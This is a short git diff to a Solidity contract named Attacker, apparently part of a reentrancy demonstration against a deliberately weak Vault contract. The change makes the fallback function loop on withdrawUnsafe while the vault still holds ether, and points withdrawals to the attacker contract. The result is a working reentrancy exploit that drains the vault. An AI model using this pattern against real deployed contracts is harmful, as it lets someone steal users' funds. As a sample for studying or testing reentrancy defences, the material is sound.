@@ -10,10 +10,16 @@ contract Attacker is IAttacker {
     }
 
     fallback() external payable {
-        Vault(address(this)).withdrawUnsafe(payable(msg.sender));
+        while(address(msg.sender).balance > 0) {
+            (bool ok, ) = msg.sender.call(abi.encodeWithSelector(IVault.withdrawUnsafe.selector, this));
+
+            if (!ok) {
+                break;
+            }
+        }
     }
 
     function attack(address vault) external {
-        Vault(vault).withdrawUnsafe(payable(msg.sender));
+        IVault(vault).withdrawUnsafe(payable(address(this)));
     }
 }
